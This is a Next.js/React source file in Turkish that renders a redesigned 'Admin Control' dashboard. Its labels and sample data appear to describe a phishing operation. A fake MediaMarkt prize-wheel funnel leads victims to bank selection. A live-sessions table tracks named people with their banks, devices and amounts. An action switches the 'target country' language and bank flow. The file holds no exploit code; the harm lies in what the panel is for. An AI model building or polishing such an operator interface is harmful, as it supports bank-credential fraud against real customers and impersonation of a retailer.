import Link from "next/link";

const overviewCards = [
  {
    label: "Aktif Oturum",
    value: "148",
    delta: "+12%",
    tone: "blue",
    detail: "Son 30 dakikada 21 yeni giriş",
  },
  {
    label: "Bugünkü Linkler",
    value: "392",
    delta: "+28%",
    tone: "orange",
    detail: "Çark akışında dönüşüm güçlü",
  },
  {
    label: "Bekleyen Onay",
    value: "19",
    delta: "-4%",
    tone: "violet",
    detail: "Özel bildirim kuyruğu dengeli",
  },
  {
    label: "Tamamlama Oranı",
    value: "%67.4",
    delta: "+6.8%",
    tone: "green",
    detail: "Son 24 saatin ortalaması",
  },
] as const;

const liveSessions = [
  { name: "M. van Dijk", flow: "Çark Oyunu", bank: "Rabobank", status: "Canlı", value: "AUD$ 5,000", device: "iPhone 15" },
  { name: "L. Jansen", flow: "Kod Girişi", bank: "ING", status: "Bekliyor", value: "AUD$ 2,500", device: "Galaxy S24" },
  { name: "A. de Boer", flow: "Direkt Banka", bank: "ABN AMRO", status: "İncelemede", value: "AUD$ 3,500", device: "MacBook Air" },
  { name: "S. Bakker", flow: "Çark Oyunu", bank: "bunq", status: "Canlı", value: "AUD$ 4,000", device: "iPad Pro" },
  { name: "E. Visser", flow: "Tebrikler", bank: "N26", status: "Tamamlandı", value: "AUD$ 2,000", device: "Windows Edge" },
] as const;

const commandActions = [
  { title: "Yeni Link Oluştur", text: "Tek tıkla kampanya girişi başlat", accent: "from-orange-500 to-amber-400" },
  { title: "Çark Varlıklarını Güncelle", text: "Desktop ve mobile layer ön izlemesiyle", accent: "from-cyan-500 to-blue-500" },
  { title: "Hedef Ülke Değiştir", text: "Dil ve banka akışını eş zamanlı değiştir", accent: "from-violet-500 to-fuchsia-500" },
] as const;

const healthItems = [
  { label: "Realtime", value: "Stabil", color: "bg-emerald-400" },
  { label: "Supabase", value: "46 ms", color: "bg-sky-400" },
  { label: "Queue", value: "7 işlem", color: "bg-amber-400" },
  { label: "Risk Alarmı", value: "Düşük", color: "bg-violet-400" },
] as const;

const wheelLayers = [
  { title: "Desktop Scene", subtitle: "Arka plan + wheel + pointer + CTA", gradient: "from-[#0d1f4f] via-[#13397b] to-[#1e63c1]" },
  { title: "Mobile Scene", subtitle: "Daha büyük wheel ve sade CTA alanı", gradient: "from-[#30124f] via-[#5b1f80] to-[#f97316]" },
  { title: "Popup System", subtitle: "Kazanç sonrası daha güçlü success state", gradient: "from-[#052b2f] via-[#0d5d67] to-[#0ea5a7]" },
] as const;

const funnelBars = [
  { label: "Kod Girişi", value: 92 },
  { label: "Çark Başlatma", value: 78 },
  { label: "Kazanç Ekranı", value: 61 },
  { label: "Banka Seçimi", value: 47 },
  { label: "Sonraki Adım", value: 33 },
] as const;

const sidebarGroups = [
  {
    title: "İzleme",
    items: ["Genel Bakış", "Canlı Oturumlar", "Performans", "Bildirimler"],
  },
  {
    title: "Operasyon",
    items: ["Banka İşlemleri", "Çark Ayarları", "Link Akışları"],
  },
  {
    title: "Sistem",
    items: ["Dil Ayarları", "Genel Ayarlar", "Kullanıcılar"],
  },
] as const;

function toneClasses(tone: string) {
  if (tone === "orange") return "from-orange-500/25 to-amber-300/10 border-orange-400/20";
  if (tone === "violet") return "from-violet-500/20 to-fuchsia-400/10 border-violet-400/20";
  if (tone === "green") return "from-emerald-500/20 to-teal-300/10 border-emerald-400/20";
  return "from-sky-500/20 to-cyan-300/10 border-sky-400/20";
}

function sessionStatusClasses(status: string) {
  if (status === "Canlı") return "bg-emerald-500/15 text-emerald-300 ring-1 ring-emerald-400/20";
  if (status === "Bekliyor") return "bg-amber-500/15 text-amber-200 ring-1 ring-amber-400/20";
  if (status === "İncelemede") return "bg-violet-500/15 text-violet-200 ring-1 ring-violet-400/20";
  return "bg-slate-500/15 text-slate-200 ring-1 ring-white/10";
}

export function AdminPreview() {
  return (
    <main className="min-h-screen overflow-hidden bg-[#07111f] text-white">
      <div className="pointer-events-none absolute inset-0 overflow-hidden">
        <div className="absolute left-[-8%] top-[-10%] h-80 w-80 rounded-full bg-cyan-500/12 blur-3xl" />
        <div className="absolute right-[-5%] top-[10%] h-96 w-96 rounded-full bg-orange-500/10 blur-3xl" />
        <div className="absolute bottom-[-12%] left-[30%] h-80 w-80 rounded-full bg-violet-500/12 blur-3xl" />
      </div>

      <div className="relative z-10 flex min-h-screen">
        <aside className="hidden w-[280px] shrink-0 border-r border-white/10 bg-[#0a1528]/90 px-5 py-6 backdrop-blur-xl xl:flex xl:flex-col">
          <div className="mb-8 flex items-center justify-between rounded-2xl border border-white/10 bg-white/5 px-4 py-4">
            <div>
              <p className="text-[11px] uppercase tracking-[0.28em] text-cyan-200/70">Preview Mode</p>
              <h1 className="mt-2 text-xl font-semibold tracking-tight">Admin Control</h1>
            </div>
            <div className="flex h-11 w-11 items-center justify-center rounded-2xl bg-gradient-to-br from-cyan-400 to-blue-500 text-sm font-bold text-slate-950">
              AH
            </div>
          </div>

          <div className="space-y-6">
            {sidebarGroups.map((group) => (
              <div key={group.title}>
                <p className="mb-3 px-3 text-[11px] font-semibold uppercase tracking-[0.26em] text-white/35">
                  {group.title}
                </p>
                <div className="space-y-1.5">
                  {group.items.map((item, index) => {
                    const active = group.title === "İzleme" && index === 0;
                    return (
                      <div
                        key={item}
                        className={`flex items-center justify-between rounded-2xl px-3 py-3 text-sm transition ${
                          active
                            ? "bg-gradient-to-r from-cyan-400/20 to-blue-500/10 text-white ring-1 ring-cyan-300/25"
                            : "text-white/65 hover:bg-white/5 hover:text-white"
                        }`}
                      >
                        <span>{item}</span>
                        {active ? <span className="h-2 w-2 rounded-full bg-cyan-300" /> : null}
                      </div>
                    );
                  })}
                </div>
              </div>
            ))}
          </div>

          <div className="mt-auto rounded-3xl border border-white/10 bg-gradient-to-br from-white/10 to-white/5 p-4">
            <p className="text-xs font-semibold uppercase tracking-[0.24em] text-orange-200/80">Tasarım Notu</p>
            <p className="mt-3 text-sm leading-6 text-white/70">
              Amaç, mevcut paneli daha sade bir arka plan, daha güçlü veri hiyerarşisi ve premium operasyon hissiyle yeniden kurmak.
            </p>
          </div>
        </aside>

        <section className="flex-1 px-4 py-4 md:px-6 md:py-6 xl:px-8">
          <div className="mx-auto max-w-[1500px]">
            <header className="rounded-[28px] border border-white/10 bg-[#0b172b]/80 px-5 py-5 shadow-[0_30px_80px_rgba(0,0,0,0.35)] backdrop-blur-xl md:px-7">
              <div className="flex flex-col gap-5 xl:flex-row xl:items-center xl:justify-between">
                <div>
                  <div className="flex flex-wrap items-center gap-3">
                    <span className="rounded-full border border-emerald-400/20 bg-emerald-500/10 px-3 py-1 text-xs font-medium text-emerald-200">
                      Sistem Stabil
                    </span>
                    <span className="rounded-full border border-white/10 bg-white/5 px-3 py-1 text-xs font-medium text-white/60">
                      MediaMarkt Österreich • Premium Preview
                    </span>
                  </div>
                  <h2 className="mt-4 text-3xl font-semibold tracking-tight md:text-4xl">
                    Daha net, daha premium, daha operasyon odaklı admin panel
                  </h2>
                  <p className="mt-3 max-w-3xl text-sm leading-7 text-white/65 md:text-base">
                    Bu ön izleme; mevcut admin yapısını daha güçlü KPI alanları, daha sakin yüzeyler, daha iyi grup yapısı ve daha dikkat çekici aksiyon bloklarıyla yeniden yorumluyor.
                  </p>
                </div>

                <div className="flex flex-wrap gap-3">
                  <Link
                    href="/admin1"
                    className="inline-flex items-center justify-center rounded-2xl border border-white/10 bg-white/5 px-4 py-3 text-sm font-medium text-white/80 transition hover:bg-white/10 hover:text-white"
                  >
                    Mevcut Panele Dön
                  </Link>
                  <button
                    type="button"
                    className="inline-flex items-center justify-center rounded-2xl bg-gradient-to-r from-orange-500 to-amber-400 px-4 py-3 text-sm font-semibold text-slate-950 shadow-[0_18px_50px_rgba(249,115,22,0.35)] transition hover:scale-[1.02]"
                  >
                    Redesign’i Uygula
                  </button>
                </div>
              </div>
            </header>

            <section className="mt-6 grid gap-4 md:grid-cols-2 2xl:grid-cols-4">
              {overviewCards.map((card) => (
                <article
                  key={card.label}
                  className={`rounded-[26px] border bg-gradient-to-br ${toneClasses(card.tone)} p-5 shadow-[0_16px_50px_rgba(0,0,0,0.22)] backdrop-blur-xl`}
                >
                  <div className="flex items-start justify-between gap-3">
                    <div>
                      <p className="text-sm text-white/60">{card.label}</p>
                      <p className="mt-3 text-3xl font-semibold tracking-tight">{card.value}</p>
                    </div>
                    <span className="rounded-full bg-white/10 px-2.5 py-1 text-xs font-semibold text-white/75">
                      {card.delta}
                    </span>
                  </div>
                  <p className="mt-6 text-sm text-white/58">{card.detail}</p>
                </article>
              ))}
            </section>

            <section className="mt-6 grid gap-6 2xl:grid-cols-[1.6fr_0.9fr]">
              <article className="rounded-[30px] border border-white/10 bg-[#0c1a30]/82 p-5 shadow-[0_20px_70px_rgba(0,0,0,0.28)] backdrop-blur-xl md:p-6">
                <div className="flex flex-col gap-4 md:flex-row md:items-center md:justify-between">
                  <div>
                    <p className="text-xs font-semibold uppercase tracking-[0.26em] text-cyan-200/60">Canlı İzleme</p>
                    <h3 className="mt-2 text-2xl font-semibold tracking-tight">Oturum Operasyon Masası</h3>
                  </div>
                  <div className="flex flex-wrap gap-2 text-xs text-white/65">
                    <span className="rounded-full border border-white/10 bg-white/5 px-3 py-1.5">Tümü</span>
                    <span className="rounded-full border border-cyan-400/20 bg-cyan-400/10 px-3 py-1.5 text-cyan-200">Çark</span>
                    <span className="rounded-full border border-white/10 bg-white/5 px-3 py-1.5">Kod</span>
                    <span className="rounded-full border border-white/10 bg-white/5 px-3 py-1.5">Banka</span>
                  </div>
                </div>

                <div className="mt-5 overflow-hidden rounded-[24px] border border-white/10">
                  <div className="grid grid-cols-[1.4fr_1fr_0.9fr_0.9fr_0.8fr_0.9fr] bg-white/[0.04] px-4 py-3 text-[11px] font-semibold uppercase tracking-[0.22em] text-white/45">
                    <span>Kullanıcı</span>
                    <span>Akış</span>
                    <span>Banka</span>
                    <span>Durum</span>
                    <span>Cihaz</span>
                    <span>Tutar</span>
                  </div>
                  <div className="divide-y divide-white/8">
                    {liveSessions.map((session) => (
                      <div
                        key={`${session.name}-${session.bank}`}
                        className="grid grid-cols-[1.4fr_1fr_0.9fr_0.9fr_0.8fr_0.9fr] items-center px-4 py-4 text-sm text-white/75 transition hover:bg-white/[0.03]"
                      >
                        <div>
                          <p className="font-medium text-white">{session.name}</p>
                          <p className="mt-1 text-xs text-white/40">Session preview</p>
                        </div>
                        <span>{session.flow}</span>
                        <span>{session.bank}</span>
                        <span className={`inline-flex w-fit rounded-full px-2.5 py-1 text-xs font-semibold ${sessionStatusClasses(session.status)}`}>
                          {session.status}
                        </span>
                        <span className="text-white/45">{session.device}</span>
                        <span className="font-semibold text-white">{session.value}</span>
                      </div>
                    ))}
                  </div>
                </div>
              </article>

              <div className="grid gap-6">
                <article className="rounded-[30px] border border-white/10 bg-[#0c1a30]/82 p-5 shadow-[0_20px_70px_rgba(0,0,0,0.28)] backdrop-blur-xl">
                  <p className="text-xs font-semibold uppercase tracking-[0.26em] text-orange-200/60">Hızlı Aksiyonlar</p>
                  <div className="mt-4 space-y-3">
                    {commandActions.map((action) => (
                      <div
                        key={action.title}
                        className="rounded-[22px] border border-white/10 bg-white/[0.035] p-4 transition hover:border-white/20 hover:bg-white/[0.05]"
                      >
                        <div className={`mb-3 h-1.5 rounded-full bg-gradient-to-r ${action.accent}`} />
                        <p className="text-sm font-semibold text-white">{action.title}</p>
                        <p className="mt-2 text-sm leading-6 text-white/58">{action.text}</p>
                      </div>
                    ))}
                  </div>
                </article>

                <article className="rounded-[30px] border border-white/10 bg-[#0c1a30]/82 p-5 shadow-[0_20px_70px_rgba(0,0,0,0.28)] backdrop-blur-xl">
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-xs font-semibold uppercase tracking-[0.26em] text-violet-200/60">Sistem Sağlığı</p>
                      <h3 className="mt-2 text-xl font-semibold">Operasyon Durumu</h3>
                    </div>
                    <span className="rounded-full bg-emerald-500/12 px-3 py-1 text-xs font-medium text-emerald-200">Healthy</span>
                  </div>
                  <div className="mt-5 grid gap-3 sm:grid-cols-2">
                    {healthItems.map((item) => (
                      <div key={item.label} className="rounded-2xl border border-white/10 bg-white/[0.04] p-4">
                        <div className="flex items-center gap-2">
                          <span className={`h-2.5 w-2.5 rounded-full ${item.color}`} />
                          <span className="text-sm text-white/60">{item.label}</span>
                        </div>
                        <p className="mt-3 text-xl font-semibold">{item.value}</p>
                      </div>
                    ))}
                  </div>
                </article>
              </div>
            </section>

            <section className="mt-6 grid gap-6 xl:grid-cols-[1.1fr_0.9fr]">
              <article className="rounded-[30px] border border-white/10 bg-[#0c1a30]/82 p-5 shadow-[0_20px_70px_rgba(0,0,0,0.28)] backdrop-blur-xl md:p-6">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-xs font-semibold uppercase tracking-[0.26em] text-cyan-200/60">Tasarım Laboratuvarı</p>
                    <h3 className="mt-2 text-2xl font-semibold tracking-tight">Çark ve akış ön izleme kartları</h3>
                  </div>
                  <span className="rounded-full border border-white/10 bg-white/5 px-3 py-1 text-xs font-medium text-white/65">
                    Asset Preview
                  </span>
                </div>

                <div className="mt-5 grid gap-4 md:grid-cols-3">
                  {wheelLayers.map((layer) => (
                    <div key={layer.title} className="rounded-[24px] border border-white/10 bg-white/[0.04] p-4">
                      <div className={`h-36 rounded-[18px] bg-gradient-to-br ${layer.gradient} p-4 shadow-inner`}>
                        <div className="flex h-full items-end justify-between rounded-[14px] border border-white/15 bg-black/10 p-3">
                          <div className="h-16 w-16 rounded-full border-4 border-white/60 bg-white/10" />
                          <div className="h-8 w-20 rounded-full bg-white/80" />
                        </div>
                      </div>
                      <p className="mt-4 text-base font-semibold text-white">{layer.title}</p>
                      <p className="mt-2 text-sm leading-6 text-white/58">{layer.subtitle}</p>
                    </div>
                  ))}
                </div>
              </article>

              <article className="rounded-[30px] border border-white/10 bg-[#0c1a30]/82 p-5 shadow-[0_20px_70px_rgba(0,0,0,0.28)] backdrop-blur-xl md:p-6">
                <p className="text-xs font-semibold uppercase tracking-[0.26em] text-orange-200/60">Dönüşüm Akışı</p>
                <h3 className="mt-2 text-2xl font-semibold tracking-tight">Funnel görünümü</h3>
                <div className="mt-6 space-y-4">
                  {funnelBars.map((bar) => (
                    <div key={bar.label}>
                      <div className="mb-2 flex items-center justify-between text-sm">
                        <span className="text-white/72">{bar.label}</span>
                        <span className="font-semibold text-white">{bar.value}%</span>
                      </div>
                      <div className="h-3 rounded-full bg-white/8">
                        <div
                          className="h-3 rounded-full bg-gradient-to-r from-cyan-400 via-blue-500 to-orange-400"
                          style={{ width: `${bar.value}%` }}
                        />
                      </div>
                    </div>
                  ))}
                </div>

                <div className="mt-8 rounded-[24px] border border-white/10 bg-gradient-to-br from-white/8 to-white/[0.03] p-4">
                  <p className="text-sm font-semibold text-white">Bu ön izleme neyi hedefliyor?</p>
                  <ul className="mt-3 space-y-2 text-sm leading-6 text-white/60">
                    <li>Daha düzenli ve gruplu bir sidebar</li>
                    <li>Daha güçlü KPI ve veri hiyerarşisi</li>
                    <li>Daha sakin ama daha kaliteli yüzey sistemi</li>
                    <li>Link, çark ve sistem aksiyonları için daha görünür merkez alanı</li>
                  </ul>
                </div>
              </article>
            </section>
          </div>
        </section>
      </div>
    </main>
  );
}
